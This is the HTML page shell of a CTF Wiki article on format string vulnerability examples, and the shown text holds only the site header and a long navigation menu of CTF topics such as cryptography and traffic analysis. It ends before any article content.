
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="CTF Wiki">
      
      
        <link rel="canonical" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_example/">
      
      
        <meta name="author" content="CTF Wiki Team">
      
      <link rel="shortcut icon" href="../../../..">
      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-6.0.2">
    
    
      
        <title>Fmtstr example - CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../../assets/stylesheets/main.f1caf91c.min.css">
      
        
        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.3f72e892.min.css">
        
      
    
    
    
      
        
        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback">
        <style>body,input{font-family:"Noto Sans",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Source Code Pro",SFMono-Regular,Consolas,Menlo,monospace}</style>
      
    
    
    
      <link rel="stylesheet" href="../../../../_static/css/extra.css">
    
    
      
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="preference" data-md-color-primary="" data-md-color-accent="">
      
        <script>matchMedia("(prefers-color-scheme: dark)").matches&&document.body.setAttribute("data-md-color-scheme","slate")</script>
      
  
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#format-string-vulnerability-example" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid" aria-label="Header">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-header-nav__button md-logo" aria-label="CTF Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>

    </a>
    <label class="md-header-nav__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
    </label>
    <div class="md-header-nav__title" data-md-component="header-title">
      
        <div class="md-header-nav__ellipsis">
          <span class="md-header-nav__topic md-ellipsis">
            CTF Wiki
          </span>
          <span class="md-header-nav__topic md-ellipsis">
            
              Fmtstr example
            
          </span>
        </div>
      
    </div>
    
      <label class="md-header-nav__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
      </label>
      
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
      </label>
      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header-nav__source">
        
<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
      </div>
    
  </nav>
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="https://ctf-wiki.github.io/ctf-wiki/" title="CTF Wiki" class="md-nav__button md-logo" aria-label="CTF Wiki">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3L1 9l11 6 9-4.91V17h2V9M5 13.18v4L12 21l7-3.82v-4L12 17l-7-3.82z"/></svg>

    </a>
    CTF Wiki
  </label>
  
    <div class="md-nav__source">
      
<a href="https://github.com/ctf-wiki/ctf-wiki/" title="前往 GitHub 仓库" class="md-source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M439.55 236.05L244 40.45a28.87 28.87 0 00-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 01-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 000 40.81l195.61 195.6a28.86 28.86 0 0040.8 0l194.69-194.69a28.86 28.86 0 000-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    ctf-wiki/ctf-wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      Introduction
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Introduction" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        <span class="md-nav__icon md-icon"></span>
        Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../.." class="md-nav__link">
      Getting Started
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/history-zh/" class="md-nav__link">
      CTF History
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/mode-zh/" class="md-nav__link">
      Introduction to CTF Competition Form
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/content-zh/" class="md-nav__link">
      CTF Contest Content
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/experience-zh/" class="md-nav__link">
      Offline Attack and Defense Experience Summary
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/cgc-zh/" class="md-nav__link">
      CGC Super Challenge
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../introduction/resources-zh/" class="md-nav__link">
      Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      Misc
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Misc" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        <span class="md-nav__icon md-icon"></span>
        Misc
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/introduction-zh/" class="md-nav__link">
      Miscellaneous Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/recon-zh/" class="md-nav__link">
      Information Gathering Technology
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
    
    <label class="md-nav__link" for="nav-2-3">
      Code Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Code Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-3">
        <span class="md-nav__icon md-icon"></span>
        Code Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/communication-zh/" class="md-nav__link">
      Commonly Used Coding in the Communication Field
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/computer-zh/" class="md-nav__link">
      Computer Related Coding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/encode/modern-zh/" class="md-nav__link">
      Commonly Used Encodings in the Real World
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/prefix-zh/" class="md-nav__link">
      Forensic Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
    
    <label class="md-nav__link" for="nav-2-5">
      Image Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Image Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-5">
        <span class="md-nav__icon md-icon"></span>
        Image Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/introduction-zh/" class="md-nav__link">
      Introduction to Image Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/png-zh/" class="md-nav__link">
      PNG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/jpg-zh/" class="md-nav__link">
      JPG
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/picture/gif-zh/" class="md-nav__link">
      GIF
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
    
    <label class="md-nav__link" for="nav-2-6">
      Traffic Packet Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Traffic Packet Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-6">
        <span class="md-nav__icon md-icon"></span>
        Traffic Packet Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/introduction-zh/" class="md-nav__link">
      Introduction to Traffic Packet Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/fix-zh/" class="md-nav__link">
      PCAP File Repairing
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-6-3" type="checkbox" id="nav-2-6-3">
    
    <label class="md-nav__link" for="nav-2-6-3">
      Protocol Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Protocol Analysis" data-md-level="3">
      <label class="md-nav__title" for="nav-2-6-3">
        <span class="md-nav__icon md-icon"></span>
        Protocol Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/README-zh/" class="md-nav__link">
      Overview of Protocol Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/Wireshark-zh/" class="md-nav__link">
      Wireshark
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTP-zh/" class="md-nav__link">
      HTTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/HTTPS-zh/" class="md-nav__link">
      HTTPS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/FTP-zh/" class="md-nav__link">
      FTP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/DNS-zh/" class="md-nav__link">
      DNS
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/WIFI-zh/" class="md-nav__link">
      WIFI
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/protocols/USB-zh/" class="md-nav__link">
      USB
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/traffic/data-zh/" class="md-nav__link">
      Data Extraction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
    
    <label class="md-nav__link" for="nav-2-7">
      Compressed Package Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Compressed Package Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-7">
        <span class="md-nav__icon md-icon"></span>
        Compressed Package Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/zip-zh/" class="md-nav__link">
      ZIP Format
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/archive/rar-zh/" class="md-nav__link">
      RAR Format
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/audio/introduction-zh/" class="md-nav__link">
      Audio Steganography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-9" type="checkbox" id="nav-2-9">
    
    <label class="md-nav__link" for="nav-2-9">
      Disk Memory Analysis
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Disk Memory Analysis" data-md-level="2">
      <label class="md-nav__title" for="nav-2-9">
        <span class="md-nav__icon md-icon"></span>
        Disk Memory Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/disk-memory/problem-zh/" class="md-nav__link">
      Title
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2-10" type="checkbox" id="nav-2-10">
    
    <label class="md-nav__link" for="nav-2-10">
      Other
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Other" data-md-level="2">
      <label class="md-nav__title" for="nav-2-10">
        <span class="md-nav__icon md-icon"></span>
        Other
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../misc/other/pyc-zh/" class="md-nav__link">
      pyc File
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      Crypto
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Crypto" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        <span class="md-nav__icon md-icon"></span>
        Crypto
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/introduction-zh/" class="md-nav__link">
      Introduction to Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-2" type="checkbox" id="nav-3-2">
    
    <label class="md-nav__link" for="nav-3-2">
      Basic Mathematics
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Basic Mathematics" data-md-level="2">
      <label class="md-nav__title" for="nav-3-2">
        <span class="md-nav__icon md-icon"></span>
        Basic Mathematics
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/basic/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-3" type="checkbox" id="nav-3-3">
    
    <label class="md-nav__link" for="nav-3-3">
      Classical Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Classical Cryptography" data-md-level="2">
      <label class="md-nav__title" for="nav-3-3">
        <span class="md-nav__icon md-icon"></span>
        Classical Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/introduction-zh/" class="md-nav__link">
      Introduction to Classical Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/monoalphabetic-zh/" class="md-nav__link">
      Single table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/polyalphabetic-zh/" class="md-nav__link">
      Multi-table Substitution Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/others-zh/" class="md-nav__link">
      Other Types of Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/classical/summary-zh/" class="md-nav__link">
      Summary
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4" type="checkbox" id="nav-3-4">
    
    <label class="md-nav__link" for="nav-3-4">
      Stream Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Stream Cipher" data-md-level="2">
      <label class="md-nav__title" for="nav-3-4">
        <span class="md-nav__icon md-icon"></span>
        Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-2" type="checkbox" id="nav-3-4-2">
    
    <label class="md-nav__link" for="nav-3-4-2">
      Pseudo Random Number Generator
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Pseudo Random Number Generator" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-2">
        <span class="md-nav__icon md-icon"></span>
        Pseudo Random Number Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/csprng-zh/" class="md-nav__link">
      Cryptographic Security Pseudo-random Number Generator
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/prng/problem-zh/" class="md-nav__link">
      Challenge Examples
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-3" type="checkbox" id="nav-3-4-3">
    
    <label class="md-nav__link" for="nav-3-4-3">
      Linear Congruence Generator
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Linear Congruence Generator" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-3">
        <span class="md-nav__icon md-icon"></span>
        Linear Congruence Generator
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/lcg/challenge-zh/" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-4" type="checkbox" id="nav-3-4-4">
    
    <label class="md-nav__link" for="nav-3-4-4">
      Feedback Shift Register
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Feedback Shift Register" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-4">
        <span class="md-nav__icon md-icon"></span>
        Feedback Shift Register
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/intro-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/lfsr-zh/" class="md-nav__link">
      Linear Feedback Shift Register
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/fsr/nfsr-zh/" class="md-nav__link">
      Nonlinear Feedback Shift Register
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-4-5" type="checkbox" id="nav-3-4-5">
    
    <label class="md-nav__link" for="nav-3-4-5">
      Special Stream Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Special Stream Cipher" data-md-level="3">
      <label class="md-nav__title" for="nav-3-4-5">
        <span class="md-nav__icon md-icon"></span>
        Special Stream Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/streamcipher/special/rc4-zh/" class="md-nav__link">
      RC4
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      Block Cipher
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Block Cipher" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        <span class="md-nav__icon md-icon"></span>
        Block Cipher
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/introduction-zh/" class="md-nav__link">
      Introduction to Block Cipher
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/arx-operations-zh/" class="md-nav__link">
      ARX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/des-zh/" class="md-nav__link">
      DES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/idea-zh/" class="md-nav__link">
      IDEA
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/aes-zh/" class="md-nav__link">
      AES
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/simon-speck-zh/" class="md-nav__link">
      Simon and Speck
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-5-7" type="checkbox" id="nav-3-5-7">
    
    <label class="md-nav__link" for="nav-3-5-7">
      Group Mode
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Group Mode" data-md-level="3">
      <label class="md-nav__title" for="nav-3-5-7">
        <span class="md-nav__icon md-icon"></span>
        Group Mode
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/introduction-zh/" class="md-nav__link">
      Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-zh/" class="md-nav__link">
      Padding Methods
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ecb-zh/" class="md-nav__link">
      ECB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cbc-zh/" class="md-nav__link">
      CBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/pcbc-zh/" class="md-nav__link">
      PCBC
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/cfb-zh/" class="md-nav__link">
      CFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ofb-zh/" class="md-nav__link">
      OFB
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/ctr-zh/" class="md-nav__link">
      CTR
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/blockcipher/mode/padding-oracle-attack-zh/" class="md-nav__link">
      Padding Oracle Attack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6" type="checkbox" id="nav-3-6">
    
    <label class="md-nav__link" for="nav-3-6">
      Asymmetric Cryptography
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="Asymmetric Cryptography" data-md-level="2">
      <label class="md-nav__title" for="nav-3-6">
        <span class="md-nav__icon md-icon"></span>
        Asymmetric Cryptography
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/introduction-zh/" class="md-nav__link">
      Introduction to Asymmetric Cryptography
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-3-6-2" type="checkbox" id="nav-3-6-2">
    
    <label class="md-nav__link" for="nav-3-6-2">
      RSA
      <span class="md-nav__icon md-icon"></span>
    </label>
    <nav class="md-nav" aria-label="RSA" data-md-level="3">
      <label class="md-nav__title" for="nav-3-6-2">
        <span class="md-nav__icon md-icon"></span>
        RSA
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_theory-zh/" class="md-nav__link">
      RSA Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../crypto/asymmetric/rsa/rsa_module_attack-zh/" class="md-nav__link">
      Modulo-related Attacks
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
